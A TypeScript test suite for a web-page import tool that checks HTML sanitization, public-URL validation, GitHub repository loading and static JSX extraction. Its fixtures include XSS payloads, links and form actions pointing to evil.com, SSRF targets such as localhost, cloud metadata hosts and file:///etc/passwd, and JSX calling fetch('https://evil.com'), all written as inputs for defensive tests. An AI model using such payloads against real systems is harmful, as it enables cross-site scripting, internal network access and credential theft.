import { test } from "node:test";
import assert from "node:assert/strict";
import { sanitizePage } from "../lib/reframe/html.ts";
import { renderPage, defaultSettings } from "../lib/reframe/design.ts";
import { parseGitHubUrl, loadRepository } from "../lib/reframe/github.ts";
import { extractJsx } from "../lib/reframe/jsx.ts";
import { validatePublicUrl, importWebsite } from "../lib/reframe/web.ts";

test("sanitizes executable markup, unsafe URLs and navigation while retaining content and resolving images", () => {
  const p = sanitizePage(
    '<title>Test</title><script>alert(1)</script><main><h1>Hello</h1><button onclick="steal()">Buy</button><a href="javascript:alert(1)">Bad</a><img src="/photo.png" onerror="x()"><iframe src="https://evil.com"></iframe><form action="https://evil.com"><input name="email"></form><svg onload="x()"></svg><style>@import "https://evil.com/a.css";a{background:url(javascript:bad)}</style></main>',
    "https://example.com",
  );
  assert.equal(p.title, "Test");
  assert.match(p.body, /Hello/);
  assert.match(p.body, /https:\/\/example.com\/photo.png/);
  assert.doesNotMatch(
    p.body,
    /onclick|onerror|javascript:|<script|<iframe|<svg|action=/i,
  );
  assert.doesNotMatch(p.css, /@import|javascript:/i);
  assert.equal(p.inventory.buttons, 1);
});
test("classifies repeated card elements without changing their content", () => {
  const p = sanitizePage(
    '<main><nav>Menu</nav><div class="product-card">One</div><div class="product-card">Two</div><input placeholder="Search"></main>',
    "https://example.com",
  );
  assert.equal(p.inventory.cards, 2);
  assert.equal(p.inventory.navigation, 1);
  assert.match(p.body, /data-rf="card"/);
});
test("export includes selected design tokens and source content inside a restrictive document", () => {
  const p = sanitizePage(
    "<main><h1>Real source content</h1><button>Save</button></main>",
    "https://example.com",
  );
  const html = renderPage(p, {
    ...defaultSettings,
    system: "material",
    style: "glass",
    accent: "#e24469",
    dark: true,
  });
  assert.match(html, /Real source content/);
  assert.match(html, /#e24469/);
  assert.match(html, /backdrop-filter/);
  assert.match(html, /script-src 'none'/);
  assert.match(html, /material/);
  assert.notEqual(html, renderPage(p, defaultSettings));
});
test("public URL validation rejects credentials, IP literals and internal hostnames", () => {
  for (const s of [
    "http://localhost",
    "https://127.0.0.1",
    "https://[::1]",
    "https://0x7f000001",
    "https://a.internal",
    "https://admin:pass@example.com",
    "file:///etc/passwd",
    "https://metadata.google.internal",
    "https://example.com:8443",
  ])
    assert.throws(() => validatePublicUrl(s));
  assert.equal(validatePublicUrl("example.com/path").hostname, "example.com");
});
test("website fetch validates redirects before requesting the target", async () => {
  const calls: string[] = [];
  const fetcher = async (url: any) => {
    calls.push(String(url));
    return new Response("", {
      status: 302,
      headers: { location: "https://127.0.0.1/secret" },
    });
  };
  await assert.rejects(
    importWebsite(
      "https://example.com",
      fetcher as typeof fetch,
      async () => true,
    ),
    /public|local|host|IP/i,
  );
  assert.equal(calls.length, 1);
});
test("website fetch rejects hosts resolving to private network addresses", async () => {
  await assert.rejects(
    importWebsite("https://example.com", fetch, async () => false),
    /public|private|network/i,
  );
});
test("parses repository, branch and file URLs", () => {
  assert.deepEqual(parseGitHubUrl("https://github.com/owner/repo"), {
    owner: "owner",
    repo: "repo",
    kind: "repo",
    tail: [],
  });
  assert.equal(
    parseGitHubUrl("https://github.com/owner/repo/tree/feature/ui").kind,
    "tree",
  );
  assert.throws(() => parseGitHubUrl("https://github.com.evil.com/a/b"));
});
test("repository access keeps tokens exclusively on GitHub API requests and uses correct branch", async () => {
  const seen: { url: string; auth: string | null }[] = [];
  const enc = (s: string) => Buffer.from(s).toString("base64");
  const fetcher = async (url: any, init: any) => {
    seen.push({
      url: String(url),
      auth: new Headers(init?.headers).get("Authorization"),
    });
    const u = String(url);
    if (u.endsWith("/repos/alice/site"))
      return Response.json({ default_branch: "main", private: true });
    if (u.includes("/branches/"))
      return Response.json({ name: "feature/ui", commit: { sha: "abc" } });
    if (u.includes("/git/trees/"))
      return Response.json({
        truncated: false,
        tree: [{ path: "index.html", type: "blob", size: 50 }],
      });
    if (u.includes("/contents/index.html"))
      return Response.json({
        content: enc("<main><h1>Private page</h1></main>"),
        encoding: "base64",
      });
    throw new Error("Unexpected request " + u);
  };
  const result = await loadRepository(
    "https://github.com/alice/site/tree/feature/ui",
    "secret-token",
    fetcher as typeof fetch,
  );
  assert.match(result.html, /Private page/);
  assert.equal(result.private, true);
  assert.equal(result.branch, "feature/ui");
  for (const c of seen) {
    assert.equal(new URL(c.url).origin, "https://api.github.com");
    assert.equal(c.auth, "Bearer secret-token");
  }
  assert.doesNotMatch(JSON.stringify(result), /secret-token/);
});
test("static JSX extraction resolves components, literals and array maps without executing code", () => {
  const files = {
    "src/App.tsx": `import Card from './Card'; const items=['Alpha','Beta']; export default function App(){return <main><h1>Hello</h1>{items.map((name)=><Card label={name}/>)}</main>}`,
    "src/Card.tsx": `export default function Card({label}){return <section className="card"><h2>{label}</h2><button>Open</button></section>}`,
  };
  const r = extractJsx(files, "src/App.tsx");
  assert.match(r.html, /Hello/);
  assert.match(r.html, /Alpha/);
  assert.match(r.html, /Beta/);
  assert.match(r.html, /class="card"/);
});
test("static JSX extraction labels unsupported dynamic content without running it", () => {
  const r = extractJsx(
    {
      "App.jsx": `export default function App(){ fetch('https://evil.com'); return <main>{getSecret()}<h1>Static heading</h1></main>}`,
    },
    "App.jsx",
  );
  assert.match(r.html, /Static heading/);
  assert.ok(r.warnings.length > 0);
  assert.doesNotMatch(r.html, /getSecret|evil.com/);
});

test("JSX children and conditional elements retain markup through component wrappers", () => {
  const r = extractJsx(
    {
      "App.jsx": `function Card({children, title='Fallback'}) { return <section style={{display:'grid',gap:16}}><h2>{title}</h2>{children}</section> } export default function App(){return <main><Card>{true && <button>Continue</button>}</Card></main>}`,
    },
    "App.jsx",
  );
  assert.match(r.html, /<button>Continue<\/button>/);
  assert.doesNotMatch(r.html, /&lt;button/);
  assert.match(r.html, /Fallback/);
  assert.match(r.html, /display:grid/);
  assert.match(r.html, /gap:16px/);
});
test("JSX strings that look like HTML remain text", () => {
  const r = extractJsx(
    {
      "App.jsx": `export default function App(){return <main>{['<strong>Literal</strong>'].map(x=>x)}</main>}`,
    },
    "App.jsx",
  );
  assert.match(r.html, /&lt;strong&gt;Literal/);
  assert.doesNotMatch(r.html, /<strong>/);
});

test("repository directory links scope the page and styles to the selected app", async () => {
  const files: Record<string, string> = {
    "index.html": "<h1>Wrong page</h1>",
    "apps/demo/index.html": "<main><h1>Selected app</h1></main>",
    "apps/demo/site.css": "main{display:grid}",
    "other.css": "body{display:none}",
  };
  const fetcher = async (url: any) => {
    const u = new URL(String(url));
    if (u.pathname.endsWith("/repos/a/b"))
      return Response.json({ default_branch: "main", private: false });
    if (u.pathname.includes("/branches/"))
      return decodeURIComponent(u.pathname.split("/branches/")[1]) === "main"
        ? Response.json({ name: "main", commit: { sha: "abc" } })
        : Response.json({ message: "not found" }, { status: 404 });
    if (u.pathname.includes("/git/trees/"))
      return Response.json({
        tree: Object.keys(files).map((path) => ({
          path,
          type: "blob",
          size: 100,
        })),
        truncated: false,
      });
    const path = decodeURIComponent(u.pathname.split("/contents/")[1] || "");
    if (files[path])
      return Response.json({
        content: Buffer.from(files[path]).toString("base64"),
        encoding: "base64",
      });
    throw new Error("Unexpected request");
  };
  const r = await loadRepository(
    "https://github.com/a/b/tree/main/apps/demo",
    "",
    fetcher as typeof fetch,
  );
  assert.match(r.html, /Selected app/);
  assert.doesNotMatch(r.html, /Wrong page/);
  assert.doesNotMatch(r.css, /display:none/);
});
test("a React file URL takes precedence over unrelated static HTML", async () => {
  const files: Record<string, string> = {
    "index.html": "<h1>Wrong static page</h1>",
    "src/App.jsx":
      "export default function App(){return <main><h1>React page</h1></main>}",
  };
  const fetcher = async (url: any) => {
    const u = new URL(String(url));
    if (u.pathname.endsWith("/repos/a/b"))
      return Response.json({ default_branch: "main", private: false });
    if (u.pathname.includes("/branches/"))
      return decodeURIComponent(u.pathname.split("/branches/")[1]) === "main"
        ? Response.json({ name: "main", commit: { sha: "abc" } })
        : Response.json({ message: "not found" }, { status: 404 });
    if (u.pathname.includes("/git/trees/"))
      return Response.json({
        tree: Object.keys(files).map((path) => ({
          path,
          type: "blob",
          size: 100,
        })),
        truncated: false,
      });
    const path = decodeURIComponent(u.pathname.split("/contents/")[1] || "");
    if (files[path])
      return Response.json({
        content: Buffer.from(files[path]).toString("base64"),
        encoding: "base64",
      });
    throw new Error("Unexpected request");
  };
  const r = await loadRepository(
    "https://github.com/a/b/blob/main/src/App.jsx",
    "",
    fetcher as typeof fetch,
  );
  assert.match(r.html, /React page/);
  assert.doesNotMatch(r.html, /Wrong static page/);
});
